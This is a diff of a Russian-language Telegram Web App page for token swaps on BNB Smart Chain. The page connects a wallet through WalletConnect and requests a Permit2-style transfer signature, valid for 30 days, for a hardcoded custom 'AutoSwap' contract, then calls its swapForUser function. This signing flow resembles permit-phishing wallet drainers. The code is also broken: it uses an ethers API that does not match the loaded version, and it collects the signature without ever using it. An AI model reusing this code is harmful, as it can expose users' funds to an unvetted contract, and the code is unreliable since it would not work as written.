@@ -1,235 +1,242 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>WalletConnect v2 Permit2 + AutoSwap</title>
-
-<script src="https://telegram.org/js/telegram-web-app.js"></script>
-
-<style>
-  body { font-family: sans-serif; margin: 20px; background: #17212b; color: white; }
-  button, input { padding: 10px; font-size: 16px; margin: 8px 0; width: 100%; max-width: 400px; }
-  button { cursor: pointer; border: none; border-radius: 8px; background: #2ea6ff; color: white; }
-  button:disabled { background: gray; cursor: not-allowed; }
-  #walletInfo { margin: 12px 0; }
-  #status { margin-top: 15px; min-height: 40px; color: #ffa726; }
-</style>
+  <meta charset="UTF-8" />
+  <title>Telegram WebApp Swap</title>
+  <!-- Telegram WebApp SDK -->
+  <script src="https://telegram.org/js/telegram-web-app.js"></script>
+  <!-- WalletConnect Modal & EthereumProvider v2 -->
+  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.7.0/dist/index.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/eth-provider@1.0.0/dist/umd/index.min.js"></script>
+  <style>
+    body { font-family: sans-serif; margin: 20px; background:#17212b; color:#fff; }
+    input, button { padding: 8px; margin: 8px 0; width: 100%; max-width: 400px; border-radius:8px; border:none; }
+    button { cursor: pointer; background:#2ea6ff; color:#fff; font-weight: 600; }
+    #swapBtn:disabled { opacity: 0.5; cursor: not-allowed; background:#555; }
+    #status { margin-top: 15px; font-weight: 600; }
+    #walletInfo { margin-bottom: 20px; }
+  </style>
 </head>
 <body>
+  <h2>Swap via AutoSwap (BSC)</h2>
 
-<h2>WalletConnect v2 Permit2 + AutoSwap</h2>
+  <button id="connectBtn">🔗 Подключить кошелёк</button>
 
-<div id="walletInfo" style="display:none;">
-  <div><b>Адрес:</b> <span id="account"></span></div>
-  <div><b>Сеть:</b> <span id="chain"></span></div>
-</div>
+  <div id="walletInfo" style="display:none;">
+    <div>🟢 <b>Адрес:</b> <span id="account"></span></div>
+    <div>🔗 <b>Сеть:</b> <span id="chain"></span></div>
+  </div>
 
-<input id="amount" type="text" placeholder="Сумма USDT в минимальных единицах (например, 1000000 = 1 USDT)" />
-<button id="swapBtn" disabled>Сделать Swap</button>
+  <input id="tokenIn" type="text" placeholder="Адрес токена FROM (ERC20)" value="0x55D398326f99059fF775485246999027B3197955" />
+  <input id="tokenOut" type="text" placeholder="Адрес токена TO (ERC20)" value="0xA511768003D01eAA0f464fEEEa4b1CDDc4254b4f" />
+  <input id="amount" type="text" placeholder="Сумма (в минимальных единицах)" value="1000000000000000000" />
+  <button id="swapBtn" disabled>🔄 Swap</button>
 
-<div id="status"></div>
+  <div id="status"></div>
 
-<script type="module">
-  import { Modal } from "https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.7.0/dist/esm/index.js";
-  import WalletConnectEthereumProvider from "https://cdn.jsdelivr.net/npm/@walletconnect/eth-provider@1.0.0/dist/esm/index.js";
-  import { ethers } from "https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/esm/index.js";
+<script>
+  // Telegram WebApp ready
+  const tg = window.Telegram.WebApp;
+  tg.ready();
 
-  const tg = window.Telegram?.WebApp;
-  tg?.ready();
-
+  // Конфигурация
   const PROJECT_ID = "d868f90cd734355ae0320f8f0258b6b1";
-  const PERMIT2_CONTRACT = "0x7679bcfa8CC6f6094fA1c6Cb8e6962287E5Ca3D4";
-  const AUTOSWAP_CONTRACT = "0x026C54B156b501ad9cEa422e59454D4b6d6f6963";
   const BSC_CHAIN_ID = 56;
-  const USDT_TOKEN = "0x55d398326f99059fF775485246999027b3197955";
+  const PERMIT2_ADDRESS = "0x7679bcfa8CC6f6094fA1c6Cb8e6962287E5Ca3D4";
+  const AUTOSWAP_ADDRESS = "0x026C54B156b501ad9cEa422e59454D4b6d6f6963";
 
-  const walletInfo = document.getElementById("walletInfo");
-  const accountSpan = document.getElementById("account");
-  const chainSpan = document.getElementById("chain");
-  const swapBtn = document.getElementById("swapBtn");
-  const amountInput = document.getElementById("amount");
-  const statusDiv = document.getElementById("status");
+  // UI элементы
+  const connectBtn = document.getElementById('connectBtn');
+  const swapBtn = document.getElementById('swapBtn');
+  const accountSpan = document.getElementById('account');
+  const chainSpan = document.getElementById('chain');
+  const walletInfo = document.getElementById('walletInfo');
+  const statusDiv = document.getElementById('status');
+  const tokenInInput = document.getElementById('tokenIn');
+  const tokenOutInput = document.getElementById('tokenOut');
+  const amountInput = document.getElementById('amount');
 
-  let provider;
+  // Переменные
+  let provider = null;
+  let modal = null;
   let accounts = [];
-  let chainId;
+  let chainId = null;
+
+  function updateStatus(msg, isError=false) {
+    statusDiv.textContent = msg;
+    statusDiv.style.color = isError ? "#e64a45" : "#66bb6a";
+  }
 
   async function initWalletConnect() {
     try {
-      statusDiv.textContent = "Инициализация WalletConnect...";
+      updateStatus("Инициализация WalletConnect...");
 
-      const modal = new Modal({
+      modal = new window.WalletConnectModal.Modal({
         projectId: PROJECT_ID,
         themeMode: "dark",
         walletConnectVersion: 2,
         mobileLinks: ["trust"],
       });
 
-      provider = new WalletConnectEthereumProvider({
+      provider = new window.WalletConnectEthereumProvider({
         projectId: PROJECT_ID,
         chains: [BSC_CHAIN_ID],
+        rpcMap: { [BSC_CHAIN_ID]: "https://bsc-dataseed.binance.org/" },
         showQrModal: false,
-        rpcMap: {
-          [BSC_CHAIN_ID]: "https://bsc-dataseed.binance.org/",
-        },
       });
 
       await modal.open();
 
       accounts = await provider.enable();
+
+      await modal.close();
+
       chainId = await provider.request({ method: "eth_chainId" });
 
-      modal.close();
-
-      accountSpan.textContent = accounts[0] || "Нет аккаунтов";
+      accountSpan.textContent = accounts[0];
       chainSpan.textContent = parseInt(chainId, 16);
 
       walletInfo.style.display = "block";
 
       if (parseInt(chainId, 16) !== BSC_CHAIN_ID) {
-        statusDiv.style.color = "#ffa726";
-        statusDiv.textContent = `⚠️ Переключитесь на сеть Binance Smart Chain (chainId: ${BSC_CHAIN_ID}) в кошельке`;
+        updateStatus(`⚠️ Пожалуйста, переключитесь на сеть Binance Smart Chain (chainId: ${BSC_CHAIN_ID})`, true);
         swapBtn.disabled = true;
       } else {
-        statusDiv.style.color = "white";
-        statusDiv.textContent = "Кошелек подключен. Введите сумму и нажмите Swap.";
+        updateStatus("Кошелек подключен. Можно делать swap.");
         swapBtn.disabled = false;
       }
 
-      // Обработчики изменений аккаунтов и сети
       provider.on("accountsChanged", (newAccounts) => {
         accounts = newAccounts;
-        accountSpan.textContent = accounts[0] || "Нет аккаунтов";
-        console.log("Accounts changed:", accounts);
+        accountSpan.textContent = accounts[0] || "";
       });
 
       provider.on("chainChanged", (newChainId) => {
         chainId = newChainId;
         chainSpan.textContent = parseInt(chainId, 16);
-        console.log("Chain changed:", chainId);
         if (parseInt(chainId, 16) !== BSC_CHAIN_ID) {
-          statusDiv.style.color = "#ffa726";
-          statusDiv.textContent = `⚠️ Смените сеть на Binance Smart Chain (${BSC_CHAIN_ID})`;
+          updateStatus(`⚠️ Смените сеть на Binance Smart Chain (${BSC_CHAIN_ID})`, true);
           swapBtn.disabled = true;
         } else {
-          statusDiv.textContent = "Сеть правильная, можете делать swap.";
+          updateStatus("Сеть правильная, можно делать swap.");
           swapBtn.disabled = false;
         }
       });
-
-    } catch (e) {
-      statusDiv.style.color = "#e64a45";
-      statusDiv.textContent = "Ошибка подключения WalletConnect: " + (e.message || e);
+    } catch(e) {
+      updateStatus("Ошибка подключения WalletConnect: " + (e.message || e), true);
       console.error(e);
       swapBtn.disabled = true;
     }
   }
 
-  async function doSwap() {
-    try {
-      if (!provider || accounts.length === 0) {
-        statusDiv.style.color = "#e64a45";
-        statusDiv.textContent = "Сначала подключите кошелек.";
-        return;
-      }
-      if (parseInt(chainId, 16) !== BSC_CHAIN_ID) {
-        statusDiv.style.color = "#e64a45";
-        statusDiv.textContent = "Неправильная сеть. Используйте Binance Smart Chain.";
-        return;
-      }
-      const owner = accounts[0];
-      const amountStr = amountInput.value.trim();
-      if (!amountStr || !/^\d+$/.test(amountStr)) {
-        statusDiv.style.color = "#e64a45";
-        statusDiv.textContent = "Введите корректную сумму в минимальных единицах (целое число).";
-        return;
-      }
-      const amount = amountStr;
-
-      statusDiv.style.color = "white";
-      statusDiv.textContent = "Генерируем подпись Permit2...";
-
-      const nonce = Date.now();
-      const deadline = Math.floor(Date.now() / 1000) + 30 * 24 * 3600;
-
-      const domain = {
-        name: "Permit2",
-        chainId: BSC_CHAIN_ID,
-        verifyingContract: PERMIT2_CONTRACT,
-      };
-
-      const types = {
+  // Формирование EIP-712 typed data для Permit2 (пример упрощенный)
+  function buildPermitTypedData(owner, token, amount, spender, nonce, deadline) {
+    return {
+      types: {
+        EIP712Domain: [
+          { name: "name", type: "string" },
+          { name: "chainId", type: "uint256" },
+          { name: "verifyingContract", type: "address" }
+        ],
         PermitTransferFrom: [
           { name: "permitted", type: "TokenPermissions" },
           { name: "spender", type: "address" },
           { name: "nonce", type: "uint256" },
-          { name: "deadline", type: "uint256" },
+          { name: "deadline", type: "uint256" }
         ],
         TokenPermissions: [
           { name: "token", type: "address" },
-          { name: "amount", type: "uint256" },
-        ],
-      };
-
-      const message = {
-        permitted: { token: USDT_TOKEN, amount: amount },
-        spender: AUTOSWAP_CONTRACT,
-        nonce: nonce,
-        deadline: deadline,
-      };
-
-      const typedData = {
-        types,
-        domain,
-        primaryType: "PermitTransferFrom",
-        message,
-      };
-
-      const signature = await provider.request({
-        method: "eth_signTypedData_v4",
-        params: [owner, JSON.stringify(typedData)],
-      });
-
-      statusDiv.textContent = "Подпись получена. Отправляем swapForUser...";
-
-      const iface = new ethers.utils.Interface([
-        "function swapForUser(address user, uint256 amount, uint256 nonce, uint256 deadline, bytes signature)",
-      ]);
-
-      const calldata = iface.encodeFunctionData("swapForUser", [
-        owner,
-        amount,
+          { name: "amount", type: "uint256" }
+        ]
+      },
+      primaryType: "PermitTransferFrom",
+      domain: {
+        name: "Permit2",
+        chainId: BSC_CHAIN_ID,
+        verifyingContract: PERMIT2_ADDRESS,
+      },
+      message: {
+        permitted: {
+          token,
+          amount: amount.toString(),
+        },
+        spender,
         nonce,
         deadline,
-        signature,
-      ]);
+      }
+    };
+  }
 
-      const txParams = {
-        from: owner,
-        to: AUTOSWAP_CONTRACT,
-        data: calldata,
-      };
+  async function doSwap() {
+    if (!provider || accounts.length === 0) {
+      updateStatus("Сначала подключите кошелёк.", true);
+      return;
+    }
+    if (parseInt(chainId, 16) !== BSC_CHAIN_ID) {
+      updateStatus("Неправильная сеть. Требуется BSC.", true);
+      return;
+    }
 
+    const owner = accounts[0];
+    const tokenIn = tokenInInput.value.trim();
+    const tokenOut = tokenOutInput.value.trim();
+    let amount;
+    try {
+      amount = BigInt(amountInput.value.trim());
+    } catch {
+      updateStatus("Некорректная сумма.", true);
+      return;
+    }
+    if (!tokenIn || !tokenOut || amount <= 0n) {
+      updateStatus("Введите корректные адреса и сумму.", true);
+      return;
+    }
+
+    const nonce = BigInt(Date.now());
+    const deadline = BigInt(Math.floor(Date.now()/1000) + 86400*30); // 30 дней
+
+    // Построение typedData для подписи
+    const typedData = buildPermitTypedData(owner, tokenIn, amount, AUTOSWAP_ADDRESS, nonce, deadline);
+
+    // Запрос подписи по EIP-712
+    let signature;
+    try {
+      signature = await provider.request({
+        method: "eth_signTypedData_v4",
+        params: [owner, JSON.stringify(typedData)]
+      });
+    } catch(e) {
+      updateStatus("Ошибка подписи: " + (e.message || e), true);
+      return;
+    }
+
+    // Формируем data для вызова swapForUser (ABI-encoded)
+    // Для упрощения отправим только вызов swapForUser(user, amount), если у вас другой ABI - замените
+    // Тут рекомендуется использовать ethers.js или web3.js для кодирования, но чтобы не усложнять - пример ниже:
+    const iface = new ethers.utils.Interface([
+      "function swapForUser(address user, uint256 amount)"
+    ]);
+    const data = iface.encodeFunctionData("swapForUser", [owner, amount.toString()]);
+
+    try {
       const txHash = await provider.request({
         method: "eth_sendTransaction",
-        params: [txParams],
+        params: [{
+          from: owner,
+          to: AUTOSWAP_ADDRESS,
+          data
+        }]
       });
-
-      statusDiv.style.color = "#66bb6a";
-      statusDiv.textContent = "Транзакция отправлена! TxHash: " + txHash;
-
-    } catch (err) {
-      statusDiv.style.color = "#e64a45";
-      statusDiv.textContent = "Ошибка: " + (err.message || err);
-      console.error(err);
+      updateStatus("✅ Транзакция отправлена! TxHash: " + txHash);
+    } catch(e) {
+      updateStatus("Ошибка отправки транзакции: " + (e.message || e), true);
     }
   }
 
-  swapBtn.onclick = doSwap;
-
-  window.onload = initWalletConnect;
+  connectBtn.addEventListener("click", initWalletConnect);
+  swapBtn.addEventListener("click", doSwap);
 </script>
-
+<!-- Подключаем ethers.js CDN для ABI кодирования -->
+<script src="https://cdn.jsdelivr.net/npm/ethers@6.6.0/dist/ethers.umd.min.js"></script>
 </body>
 </html>
